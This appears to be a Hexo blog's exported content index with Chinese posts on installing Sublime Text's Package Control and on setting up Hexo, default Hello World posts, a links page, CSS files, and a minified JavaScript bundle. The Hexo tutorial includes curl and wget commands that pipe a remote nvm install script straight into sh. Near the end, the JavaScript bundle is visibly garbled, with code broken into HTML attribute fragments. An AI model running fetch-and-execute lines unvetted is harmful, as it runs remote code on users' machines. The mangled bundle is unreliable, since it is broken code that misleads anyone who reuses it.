sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( &apos;http://packagecontrol.io/&apos; + pf.replace(&apos; &apos;, &apos;%20&apos;)).read(); dh = hashlib.sha256(by).hexdigest(); print(&apos;Error validating download (got %s instead of %s), please try manual install&apos; % (dh, h)) if dh != h else open(os.path.join( ipp, pf), &apos;wb&apos; ).write(by)  </code></pre><p>sublime text 2 输入以下命令然后回车  </p><pre><code>import urllib2,os,hashlib; h = &apos;eb2297e1a458f27d836c04bb0cbaf282&apos; + &apos;d0e7a3098092775ccb37ca9d6b2e4b7d&apos;; pf = &apos;Package Control.sublime-package&apos;; ipp = sublime.installed_packages_path(); os.makedirs( ipp ) if not os.path.exists(ipp) else None; urllib2.install_opener( urllib2.build_opener( urllib2.ProxyHandler()) ); by = urllib2.urlopen( &apos;http://packagecontrol.io/&apos; + pf.replace(&apos; &apos;, &apos;%20&apos;)).read(); dh = hashlib.sha256(by).hexdigest(); open( os.path.join( ipp, pf), &apos;wb&apos; ).write(by) if dh == h else None; print(&apos;Error validating download (got %s instead of %s), please try manual install&apos; % (dh, h) if dh != h else &apos;Please restart Sublime Text to finish installation&apos;)  </code></pre></blockquote><p>安装成功后点击Preference就可以看到Package Setting和Package Control</p><hr><h2 id="安装各种插件"><a href="#安装各种插件" class="headerlink" title="安装各种插件"></a>安装各种插件</h2><p>例如Theme - Spacegray<br>这是一个好看的主题 Github主页👉<a href="https://github.com/kkga/spacegray" target="_blank" rel="noopener">Theme - Spacegray</a><br>安装好了Package Control之后可以在Command Palette中找到Theme - Spacegray  </p><ol><li>打开Command Palette:<code>Tools -&gt; Command Palette</code>或者使用快捷键<code>shift+cmd+P</code>  </li><li>输入<code>PCIP</code>就可以定位到<code>Package Control: Install Package</code>然后回车  </li><li>搜索<code>Theme - Spacegray</code>然后回车  </li><li>在<code>Sublime Text -&gt; Preferences -&gt; Setting - User</code>(快捷键<code>cmd + ,</code>)中输入<pre><code>{&quot;theme&quot;: &quot;Spacegray Eighties.sublime-theme&quot;,&quot;color_scheme&quot;: &quot;Packages/Theme - Spacegray/base16-eighties.dark.tmTheme&quot;}  </code></pre></li><li>重启sublime就可以看到效果了  </li></ol><hr><h1 id="sublime-text-也是个大坑"><a href="#sublime-text-也是个大坑" class="headerlink" title="sublime text 也是个大坑"></a>sublime text 也是个大坑</h1><p>何止是文档打开工具呢？简直就是生产力工具<br>就把网页链接放这里吧，懒得<code>cmd + d</code>了  </p><blockquote><p><a href="http://www.sheyilin.cn/2015/05/sublime_text_3_tiao_jiao_ni_de_si_ren_li_qi_1/" target="_blank" rel="noopener"> Sublime Text 3 调教你的私人利器（上）</a>👈插件介绍，推荐设置，快捷键修改，默认html补全，插件调教<br><a href="http://www.sheyilin.cn/2015/05/sublime_text_3_tiao_jiao_ni_de_si_ren_li_qi_2/" target="_blank" rel="noopener"> Sublime Text 3 调教你的私人利器（下）</a>👈（接上条）插件调教，推荐设置<br><a href="https://github.com/jikeytang/sublime-text" target="_blank" rel="noopener">jikeytang/sublime-text</a>插件介绍,推荐设置,快捷键,<strong>网页推荐</strong><br><a href="https://packagecontrol.io" target="_blank" rel="noopener">Package Control</a>Package Control官网，插件介绍<br><a href="http://zh.lucida.me/blog/sublime-text-complete-guide/" target="_blank" rel="noopener">Sublime Text 全程指南</a>什么都有<br><a href="http://www.jianshu.com/p/25cdc7d608bb" target="_blank" rel="noopener">Mac下Sublime Text 2使用心得</a>写的比我好多了就是了</p></blockquote><p>另知乎提问  </p><blockquote><p><a href="http://www.zhihu.com/question/24896283" target="_blank" rel="noopener">Sublime Text 有哪些使用技巧？</a><br><a href="http://www.zhihu.com/question/24736400" target="_blank" rel="noopener">sublime text 3 插件推荐？</a>  </p></blockquote><hr><h1 id="这总不算烂尾了吧？"><a href="#这总不算烂尾了吧？" class="headerlink" title="这总不算烂尾了吧？"></a>这总不算烂尾了吧？</h1><p>终于把打开的那么多页面关差不多了好舒心。</p>]]></content>
      
      
      <categories>
          
          <category> Geek Talks · 奇客怪谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> howto </tag>
            
            <tag> sublime </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>这个博客建立的流程</title>
      <link href="/2015/09-09-howto/"/>
      <url>/2015/09-09-howto/</url>
      
        <content type="html"><![CDATA[<p>关于本篇博文<br>简述了安装Hexo的简单流程，遇见问题的话，善用Google可以帮助你<br>命令行出错的话请尝试在命令之前加上sudo  </p><a id="more"></a><hr><h1 id="安装Hexo之前"><a href="#安装Hexo之前" class="headerlink" title="安装Hexo之前"></a>安装Hexo之前</h1><blockquote><p><strong> Mac用户 </strong><br>在编译的时候可能会遇到问题，请先安装Xcode<br>然后进入Preferences-&gt;Download-&gt;Command Line Tools-&gt;Install 安装命令行工具  </p></blockquote><h2 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h2><p>在<a href="http://nodejs.org" target="_blank" rel="noopener">Node.js官网</a>可以下载到安装包<br><strong>或者</strong>使用<a href="https://github.com/creationix/nvm" target="_blank" rel="noopener">nvm</a>进行安装<br>cURL:  </p><pre><code>$ curl https://raw.github.com/creationix/nvm/master/install.sh | sh  </code></pre><p>或者 Wget:  </p><pre><code>$ wget -qO- https://raw.github.com/creationix/nvm/master/install.sh | sh</code></pre><p>以上任一方式安装，重启终端后执行以下命令即可安装Node.js  </p><pre><code>$ nvm install 0.10  </code></pre><p>安装成功后即可使用npm命令  </p><pre><code class="bash">$ npm -v</code></pre><p>如果安装成功返回的是npm的版本信息  </p><h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p>在<a href="http://git-scm.com" target="_blank" rel="noopener">Git官网</a>可以下载到安装包<br><strong>或者</strong>使用<a href="http://mxcl.github.com/homebrew/" target="_blank" rel="noopener">Homebrew</a>，<a href="http://www.macports.org/" target="_blank" rel="noopener">MacPorts</a>进行安装<br>安装成功后可使用git命令  </p><pre><code class="bash">$ git --version</code></pre><p>如果安装成功返回的是git的版本信息  </p><hr><h1 id="开始安装Hexo"><a href="#开始安装Hexo" class="headerlink" title="开始安装Hexo"></a>开始安装Hexo</h1><p>在<strong>确保</strong>自己安装了Node.js以及Git之后<br>使用以下命令   </p><pre><code class="bash">$ npm install -g hexo-cli</code></pre><p>安装成功后可使用hexo命令  </p><pre><code>$ hexo -v   </code></pre><p>如果安装成功返回的是Hexo的版本信息  </p><hr><h1 id="开始使用Hexo"><a href="#开始使用Hexo" class="headerlink" title="开始使用Hexo"></a>开始使用Hexo</h1><p>请<strong>在你想安装的位置</strong>使用以下命令</p><pre><code>$ hexo init $ npm install  </code></pre><p>安装成功后可在指定文件夹下看到文件目录  </p><pre><code>.  ├── _config.yml  ├── package.json  ├── scaffolds  ├── scripts  ├── source  |   ├── _drafts  |   └── _posts  └── themes  </code></pre><p>如果跟上面一样就说明建站成功了<br>各个文件的说明请参照 <a href="https://hexo.io/zh-cn/docs/setup.html" target="_blank" rel="noopener">建站｜Hexo</a>  </p><hr><h1 id="添加一篇文章"><a href="#添加一篇文章" class="headerlink" title="添加一篇文章"></a>添加一篇文章</h1><p>使用以下命令(用你想要的名字代替<code>yourblogname</code>字段)  </p><pre><code>$ hexo new &quot;yourblogname&quot;  </code></pre><p><em>比如你想创建一篇叫做“abc”的新文章，那么使用以下命令</em>    </p><pre><code>$ hexo new &quot;abc&quot;  </code></pre><p>然后你可以在<code>你的hexo位置</code>/source/_posts 文件夹中找到你的新文章<br><em>以刚才的<code>abc</code>文章为例，在这个文件夹中新文章为<code>abc.md</code></em><br>用支持的软件编辑该文件开始编辑（至少我是这么做的，好像有点麻烦）  </p><blockquote><p>以<code>.md</code>结尾的是markdown文件<br>如果你想了解更多关于markdown的信息请看这篇文章  <a href="/2015/09/10/关于markdown/">关于markdown</a>  </p></blockquote><p>在你更新、删除之后都不用再使用<code>hexo g</code>或者<code>hexo s</code>命令来重新启动服务<br>你要做的所用工作只是简单的<strong>在浏览器中刷新 <a href="http://0.0.0.0:4000" target="_blank" rel="noopener">http://0.0.0.0:4000</a></strong><br>简单的刷新就可以让你看到你对博客的更改</p><hr><h1 id="在Hexo中加载NexT主题"><a href="#在Hexo中加载NexT主题" class="headerlink" title="在Hexo中加载NexT主题"></a>在Hexo中加载NexT主题</h1><p>参见右边链接  <a href="http://theme-next.iissnan.com" target="_blank" rel="noopener">NexT - an elegant theme for Hexo</a>  </p><hr><h1 id="将网站部署到Github"><a href="#将网站部署到Github" class="headerlink" title="将网站部署到Github"></a>将网站部署到Github</h1><p>参见右边链接  <a href="http://ibruce.info/2013/11/22/hexo-your-blog/" target="_blank" rel="noopener">hexo你的博客|不如</a><br>不说了都是泪  </p>]]></content>
      
      
      <categories>
          
          <category> Geek Talks · 奇客怪谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> howto </tag>
            
            <tag> abc </tag>
            
            <tag> hexo </tag>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「翻译」Hello World</title>
      <link href="/2015/09-08-tranHelloWorld/"/>
      <url>/2015/09-08-tranHelloWorld/</url>
      
        <content type="html"><![CDATA[<p>  欢迎来到 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>！这是你的第一篇文章。在<a href="http://hexo.io/docs/" target="_blank" rel="noopener">这个文档</a>查看更多的信息。如果在使用Hexo时遇到了任何问题，你可以在<a href="http://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">这个页面</a>找到答案，或者在<a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">Github</a>上直接询问我。<br>  <a id="more"></a></p><h2 id="快速开始"><a href="#快速开始" class="headerlink" title="快速开始"></a>快速开始</h2><h3 id="创建一个新页面"><a href="#创建一个新页面" class="headerlink" title="创建一个新页面"></a>创建一个新页面</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>了解更多: <a href="http://hexo.io/docs/writing.html" target="_blank" rel="noopener">写作</a></p><h3 id="开启服务器"><a href="#开启服务器" class="headerlink" title="开启服务器"></a>开启服务器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>了解更多: <a href="http://hexo.io/docs/server.html" target="_blank" rel="noopener">服务器</a></p><h3 id="生成静态文件"><a href="#生成静态文件" class="headerlink" title="生成静态文件"></a>生成静态文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>了解更多: <a href="http://hexo.io/docs/generating.html" target="_blank" rel="noopener">生成文件</a></p><h3 id="部署到远程站点"><a href="#部署到远程站点" class="headerlink" title="部署到远程站点"></a>部署到远程站点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>了解更多: <a href="http://hexo.io/docs/deployment.html" target="_blank" rel="noopener">部署</a></p>]]></content>
      
      
      <categories>
          
          <category> 疑似机器人 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> try </tag>
            
            <tag> trans </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>第二篇博文</title>
      <link href="/2015/09-08-%E7%AC%AC%E4%BA%8C%E7%AF%87%E5%8D%9A%E6%96%87/"/>
      <url>/2015/09-08-%E7%AC%AC%E4%BA%8C%E7%AF%87%E5%8D%9A%E6%96%87/</url>
      
        <content type="html"><![CDATA[<p>此处及以上的内容会在首页显示<br><a id="more"></a><br>以下是首页隐藏的内容</p>]]></content>
      
      
      <categories>
          
          <category> 疑似机器人 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> try </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hello World</title>
      <link href="/2015/09-08-hello-world/"/>
      <url>/2015/09-08-hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="http://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="http://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="http://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><p>``` bash<br>$ hexo new “My New Post”<br>```</p><p>More info: <a href="http://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><p>``` bash<br>$ hexo server<br>```</p><p>More info: <a href="http://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><p>``` bash<br>$ hexo generate<br>```</p><p>More info: <a href="http://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><p>``` bash<br>$ hexo deploy<br>```</p><p>More info: <a href="http://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> 疑似机器人 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> try </tag>
            
        </tags>
      
    </entry>
    
  
  
    
    <entry>
      <title>友链</title>
      <link href="/links.html"/>
      <url>/links.html</url>
      
        <content type="html"><![CDATA[<style>.meta {    display: none;}.page {    text-align: center;}.links-container {    display: flex;    flex-flow: row wrap;    justify-content: space-between;    align-items: flex-start;    padding: 12px 0;}.card {    background: #edeef2;    border-radius: 12px;    margin: 4px 0;    width: 45%;}.card:hover {    text-decoration: none;    transform: scale(1.1);}.card-title, .card-content {    padding: 12px 16px;    color: #333;    text-align: left;}.card-title {    padding: 8px 16px;    background: rgba(255,255,255,.4);}.card-title img {    position: static;    display: inline-block;    margin: 0;    height: 20px;    transform: translate(-35%);    border-radius: 4px;}@media screen and (max-width:440px){    .links-container {        justify-content: space-around;    }    .card {        width: 100%;    }}</style><h4><i>至于友链，我已经想到了一种绝妙的展现方式，可惜这里空间太小，我写不下</i></h4><div class="links-container">    <a href="https://www.logcg.com" class="card" target="_blank" rel="noopener">        <div class="card-title">            <img src="https://www.logcg.com/wp-content/uploads/2015/07/favicon.ico">            落格博客        </div>        <div class="card-content">Log everything.</div>    </a>    <a href="http://blog.daraw.cn" class="card" target="_blank" rel="noopener">        <div class="card-title">            <img src="https://avatars3.githubusercontent.com/u/12277082?v=3&s=466">            DaraW        </div>        <div class="card-content">前端只是一个 TITLE</div>    </a>    <a href="https://egoistian.com" class="card" target="_blank" rel="noopener">        <div class="card-title">            <img src="https://avatars1.githubusercontent.com/u/8784712?v=3&s=466">            庶民样本        </div>        <div class="card-content">隱約雷鳴，陰霾天空，但盼風雨來，能留你在此。</div>    </a>    <a href="http://www.jvaeyhcd.cc/" class="card" target="_blank" rel="noopener">        <div class="card-title">            <img src="https://avatars2.githubusercontent.com/u/6993775?v=3&s=460">            Jvaeyhcd's Note        </div>        <div class="card-content">You're uinique, nothing can replace you.</div>    </a>    <a href="http://www.yatessss.com/" class="card" target="_blank" rel="noopener">        <div class="card-title">            <img src="http://7xqch8.com1.z0.glb.clouddn.com/%E5%A4%B4%E5%83%8F4bed2e738bd4b31ca1ce4d1787d6277f9f2ff8a8.jpg">            yatessss        </div>        <div class="card-content">凡求的必得到, 寻的必找到, 敲的必给他开</div>    </a>    <a href="https://github.com/bczFE/articles" class="card" target="_blank" rel="noopener">        <div class="card-title">            <img src="https://avatars3.githubusercontent.com/u/37927548?s=200&v=4">            超爱前端        </div>        <div class="card-content">BaicizhanFE (Unofficially)</div>    </a></div>]]></content>
      
    </entry>
    
    <entry>
      <title></title>
      <link href="/flex/all.css"/>
      <url>/flex/all.css</url>
      
        <content type="html"><![CDATA[.section{display:flex;flex-direction:column;align-items:center;padding:70px 0;font-family:'Avenir Next', 'Avenir', 'Helvetica Neue', 'Helvetica', 'Lantinghei SC', 'Hiragino Sans GB', sans-serif;text-align:center}h1{font-size:4.5rem}p{margin:40px 0 30px 0;font-size:1.8rem;font-weight:500}.meta{font-size:1rem;font-weight:400;line-height:2rem;color:#aaa}a{color:#000;text-decoration:none}a:hover{text-decoration:underline}code{padding:0 7px;border-radius:5px}ul{margin:0;text-align:start;font-size:1.8rem;font-weight:500}ul li{margin:10px 0}#disqus_thread{padding-bottom:80px;position:absolute;width:55%;left:50%;transform:translate(-50%)}.counter{position:relative}.container-common{color:#C5E99B;background-color:#548687}.container-common code{background-color:#285943}.justify-content{color:#373c4d;background-color:#d9e1e8}.justify-content code{background-color:#9ba7b6}.align-items{color:#a3daff;background-color:#0080ff}.align-items code{background-color:#283f4c}.item-common{color:#c9d6de;background-color:#52616a}.item-common code{background-color:#2c3f4a}.align-self{color:#fffcf0;background-color:#6a60a9}.align-self code{background-color:#38335A}@media screen and (max-width: 782px){h1{font-size:3.5em}img{width:100%}#disqus_thread{padding-bottom:50px;width:80%}}/*# sourceMappingURL=all.css.map */]]></content>
      
    </entry>
    
    <entry>
      <title></title>
      <link href="/em2px/em2px.css"/>
      <url>/em2px/em2px.css</url>
      
        <content type="html"><![CDATA[html,body,#vue{min-height:100%;font-family:'Avenir Next', 'Avenir', 'Helvetica Neue', 'Helvetica', 'Lantinghei SC', 'Hiragino Sans GB', sans-serif}.container{background:#5aa}a{color:#FFC04D;text-decoration:none}a:hover{text-decoration:underline}.title{font-size:40px;color:#9cd954}.title a{color:#ffa706}.title p{font-size:28px}.title .meta{font-size:1.1rem;font-weight:400;line-height:2rem}.container,#vue{display:flex;text-align:center;justify-content:center;align-items:center;flex-direction:row;padding:10px}#vue{margin-top:6%;display:flex;flex-direction:column}.base{font-size:1.1rem;color:#C5E99B}.base input{font-size:1.1rem;width:32px}.input-item{font-size:55px;padding:0 10px;font-weight:600;color:#C5E99B}input{max-width:120px;padding-right:12px;text-align:right;border:0;font:50px/1 'Courier New', 'Lucida Console', Courier, monospace;background:#5aa;color:#FFC04D}input:focus{outline:0}@media screen and (max-width: 1024px){.container{flex-direction:column}.input-item{margin:10px 0}}/*# sourceMappingURL=em2px.css.map */]]></content>
      
    </entry>
    
    <entry>
      <title></title>
      <link href="/css/main.e9325bc8.css"/>
      <url>/css/main.e9325bc8.css</url>
      
        <content type="html"><![CDATA[html{display:-webkit-flex;display:flex;width:100%;overflow-x:hidden;font-family:Avenir Next,Avenir,-apple-system,BlinkMacSystemFont,PingFang SC,Helvetica Neue,STHeiti,Microsoft Yahei,Tahoma,Simsun,sans-serif;font-weight:400;font-style:normal;font-stretch:normal;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-font-smoothing:antialiased;vertical-align:baseline;-moz-osx-font-smoothing:grayscale;-webkit-tap-highlight-color:transparent;text-rendering:optimizeLegibility;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;text-size-adjust:100%}*{margin:0;padding:0;box-sizing:border-box}body,html{width:100%}img{display:block}.row{-webkit-flex-direction:column;flex-direction:column}.line,.row{display:-webkit-flex;display:flex}.flexC{-webkit-align-items:center;align-items:center}.flexB{-webkit-justify-content:space-between;justify-content:space-between}.blue{color:#7ea9ff}.red{color:#db4437}.yellow{color:#f4b400}.green{color:#0f9d58}.black{color:#000}._red{background:#db4437}._yellow{background:#f4b400}._yellow:before{position:absolute;content:"";top:0;left:-5px;width:0;height:0;border-left:10px solid #db4437;border-top:11px solid #f4b400;border-bottom:11px solid #f4b400}._green{background:#0f9d58}._green:before{position:absolute;content:"";top:0;left:-5px;width:0;height:0;border-left:10px solid #f4b400;border-top:11px solid #0f9d58;border-bottom:11px solid #0f9d58}._blue{background:#4285f4}._blue:before{left:-5px;border-left:10px solid #0f9d58;border-top:11px solid #4285f4;border-bottom:11px solid #4285f4}._blue:after,._blue:before{position:absolute;content:"";top:0;width:0;height:0}._blue:after{right:-5px;border-left:10px solid #4285f4;border-top:11px solid #212121;border-bottom:11px solid #212121}.w6{font-weight:600}.w20{width:20px}.w40{width:40px}.w60{width:60px}.w80{width:80px}.w100{width:100px}input:focus{outline:none}.c1c8n1a8,input{cursor:none}.c1c8n1a8{font-size:14px;line-height:1;position:relative;height:100vh}.c1c8n1a8 span{display:inline-block;position:relative;padding:4px 10px}.c1c8n1a8 input{color:#fff;font-size:14px;padding:4px 10px;height:22px}.c1c8n1a8 .full{width:100%}]]></content>
      
    </entry>
    
    <entry>
      <title></title>
      <link href="/js/main.564ead94.js"/>
      <url>/js/main.564ead94.js</url>
      
        <content type="html"><![CDATA[!function(t){function e(e){for(var o,s,i=e[0],l=e[1],c=e[2],p=0,m=[];p<i.length;p++)s=i[p],r[s]&&m.push(r[s][0]),r[s]=0;for(o 0="==t)throw" in="" l)object.prototype.hasownproperty.call(l,o)&&(t[o]="l[o]);for(u&&u(e);m.length;)m.shift()();return" a.push.apply(a,c||[]),n()}function="" n(){for(var="" t,e="0;e<a.length;e++){for(var" n="a[e],o=!0,i=1;i<n.length;i++){var" l="n[i];0!==r[l]&&(o=!1)}o&&(a.splice(e--,1),t=s(s.s=n[0]))}return" t}var="" o="{},r={0:0},a=[];function" s(e){if(o[e])return="" o[e].exports;var="" t[e].call(n.exports,n,n.exports,s),n.l="!0,n.exports}s.m=t,s.c=o,s.d=function(t,e,n){s.o(t,e)||Object.defineProperty(t,e,{enumerable:!0,get:n})},s.r=function(t){"undefined"!=typeof" symbol&&symbol.tostringtag&&object.defineproperty(t,symbol.tostringtag,{value:"module"}),object.defineproperty(t,"__esmodule",{value:!0})},s.t="function(t,e){if(1&e&&(t=s(t)),8&e)return" t;if(4&e&&"object"="=typeof" t&&t&&t.__esmodule)return="" t;var="" t)for(var="" t)s.d(n,o,function(e){return="" t[e]}.bind(null,o));return="" n},s.n="function(t){var" e="t&&t.__esModule?function(){return" t.default}:function(){return="" t};return="" s.d(e,"a",e),e},s.o="function(t,e){return" object.prototype.hasownproperty.call(t,e)},s.p="/" ;var="" i="window.webpackJsonp=window.webpackJsonp||[],l=i.push.bind(i);i.push=e,i=i.slice();for(var" c="0;c<i.length;c++)e(i[c]);var" u="l;a.push([9,1]),n()}({10:function(t,e,n){},26:function(t,e,n){},27:function(t,e,n){"use" strict";n.r(e);n(10);var="" w(t){return="" function(t){if(array.isarray(t)){for(var="" array(t.length);e<t.length;e++)n[e]="t[e];return" n}}(t)||function(t){if(symbol.iterator="" object(t)||"[object="" arguments]"="==Object.prototype.toString.call(t))return" array.from(t)}(t)||function(){throw="" new="" typeerror("invalid="" attempt="" to="" spread="" non-iterable="" instance")}()}function="" _(){return(_="Object.assign||function(t){for(var" n)object.prototype.hasownproperty.call(n,o)&&(t[o]="n[o])}return" t}).apply(this,arguments)}function="" s(t){return(s="function" =="typeof" symbol&&"symbol"="=typeof" symbol.iterator?function(t){return="" typeof="" t}:function(t){return="" t&&"function"="=typeof" symbol&&t.constructor="==Symbol&&t!==Symbol.prototype?"symbol":typeof" t})(t)}function="" k(t){for(var="" object.getownpropertysymbols&&(o="o.concat(Object.getOwnPropertySymbols(n).filter(function(t){return" object.getownpropertydescriptor(n,t).enumerable}))),o.foreach(function(e){c(t,e,n[e])})}return="" t}function="" e(t,e){for(var="" o&&(o.writable="!0),Object.defineProperty(t,o.key,o)}}function" n(t){return(n="Object.setPrototypeOf?Object.getPrototypeOf:function(t){return" t.__proto__||object.getprototypeof(t)})(t)}function="" o(t){if(void="" referenceerror("this="" hasn't="" been="" initialised="" -="" super()="" called");return="" a(t,e){return(a="Object.setPrototypeOf||function(t,e){return" t.__proto__="e,t})(t,e)}function" c(t,e,n){return="" t?object.defineproperty(t,e,{value:n,enumerable:!0,configurable:!0,writable:!0}):t[e]="n,t}var" t="function(t){function" e(t){var="" n;return="" function(t,e){if(!(t="" instanceof="" e))throw="" typeerror("cannot="" call="" a="" class="" as="" function")}(this,e),(n="function(t,e){return!e||"object"!==S(e)&&"function"!=typeof" e?o(t):e}(this,n(e).call(this,t))).state="{commands:{},stdout:[],history:[],historyPosition:null,previousHistoryPosition:null,processing:!1},n.terminalRoot=l.a.createRef(),n.terminalInput=l.a.createRef(),n.focusTerminal=n.focusTerminal.bind(O(n)),n.validateCommands=n.validateCommands.bind(O(n)),n.showWelcomeMessage=n.showWelcomeMessage.bind(O(n)),n.showHelp=n.showHelp.bind(O(n)),n.pushToStdout=n.pushToStdout.bind(O(n)),n.getStdout=n.getStdout.bind(O(n)),n.clearStdout=n.clearStdout.bind(O(n)),n.processCommand=n.processCommand.bind(O(n)),n.handleInput=n.handleInput.bind(O(n)),n}return" function(t,e){if("function"!="typeof" e&&null!="=e)throw" typeerror("super="" expression="" must="" either="" be="" null="" or="" function");t.prototype="Object.create(e&&e.prototype,{constructor:{value:t,writable:!0,configurable:!0}}),e&&A(t,e)}(e,l.a.Component),function(t,e,n){e&&E(t.prototype,e),n&&E(t,n)}(e,[{key:"focusTerminal",value:function(){this.terminalInput.current.focus()}},{key:"scrollToBottom",value:function(){var" list="" of="" available="" commands.",fn:this.showhelp},clear:{description:"empty="" the="" terminal="" window.",explicitexec:!0,fn:this.clearstdout}};for(var="" r="" n[r].fn)throw="" error("'fn'="" property="" command="" '".concat(r,"'="" is="" invalid;="" expected="" 'function',="" got="" '").concat(s(n[r].fn),"'"));if(!this.props.nodefaults&&e.includes(r))throw="" error("attempting="" overwrite="" default '".concat(e[e.indexof(r)],"';="" cannot="" override="" commands"));n[r].description||(n[r].description="None" ),t[r]="n[r]}this.setState({commands:t})}},{key:"showWelcomeMessage",value:function(){var" e?this.pushtostdout("welcome="" react="" terminal!="" type="" 'help'="" get="" commands."):array.isarray(e)?e.map(function(e){return="" t.pushtostdout(l.a.createelement("span",null,e))}):this.pushtostdout(l.a.createelement("span",null,e))}},{key:"showhelp",value:function(){for(var="" this.state.commands){var="" ".concat(e.usage):"";this.pushtostdout(l.a.createelement("span",null,"".concat(t,"="" ").concat(e.description).concat(n)))}}},{key:"pushtostdout",value:function(t,e){var="" this.state.stdout.map(function(e,n){var="" t.props.dangermode?r:o})}},{key:"clearstdout",value:function(){this.setstate({stdout:[]})}},{key:"clearinput",value:function(){this.setstate({historyposition:null}),this.terminalinput.current.value="" }},{key:"processcommand",value:function(){var="" "),r="o.splice(0,1)[0],a=o;if(t.props.noAutomaticStdout||(t.props.noHistory?t.pushToStdout(l.a.createElement("div",{className:"line" 174"},t.props.promptlabel(),l.a.createelement("span",null,n))):t.pushtostdout(l.a.createelement("div",{classname:"line="" 170"},t.props.promptlabel(),l.a.createelement("span",null,n)),n)),n){e.rawinput="n,e.command=r,e.args=a;var" s="t.state.commands[r];if(s){var" t.pushtostdout(l.a.createelement("span",null,t.props.errortext?t.props.errortext.replace(="" \[command\]="" gi,r):"command="" not="" found!")))}t.setstate({processing:!1},function(){t.clearinput(),t.props.noautoscroll||t.scrolltobottom(),t.props.commandcallback&&t.props.commandcallback(e)})})}},{key:"scrollhistory",value:function(t){var="" array.from(t).filter(function(t){return="" void="" 0!="=t})}(this.state.history).reverse(),n=this.state.historyPosition,o=this.state.previousHistoryPosition,r=this.terminalInput.current;if(!this.state.noAutomaticStdout&&e.length">0)switch(t){case"up":null===n?(r.value=e[0],this.setState({historyPosition:0,previousHistoryPosition:null})):n+1===e.length?(r.value=e[e.length-1],this.setState({historyPosition:e.length-1,previousHistoryPosition:e.length-2})):(r.value=e[n+1],this.setState({historyPosition:n+1,previousHistoryPosition:n}));break;case"down":null!==n&&e[n]?n-1==-1?(r.value=null===o||0===n&&1===o?"":e[0],this.setState({historyPosition:null,previousHistoryPosition:null})):(r.value=e[n-1],this.setState({historyPosition:n-1,previousHistoryPosition:n})):(r.value="",this.setState({historyPosition:null,previousHistoryPosition:null}))}}},{key:"handleInput",value:function(t){switch(t.key){case"Enter":this.processCommand();break;case"ArrowUp":this.scrollHistory("up");break;case"ArrowDown":this.scrollHistory("down")}}},{key:"componentDidUpdate",value:function(t){p()(t.commands)!==p()(this.props.commands)&&this.validateCommands()}},{key:"componentDidMount",value:function(){this.validateCommands(),this.props.welcomeMessage&&this.showWelcomeMessage(),this.props.autoFocus&&this.focusTerminal()}},{key:"render",value:function(){var t={container:k({},m,{background:this.props.background||"#212121",backgroundSize:this.props.backgroundSize||"cover"}),content:k({},f,{color:this.props.textColor||"#FFFFFF",fontFamily:this.props.contentFontFamily||"monospace"}),inputArea:k({},h),prompt:k({},d,{color:this.props.promptLabelColor}),input:k({},y,{color:this.props.promptTextColor,fontFamily:this.props.inputFontFamily||"monospace"})};return 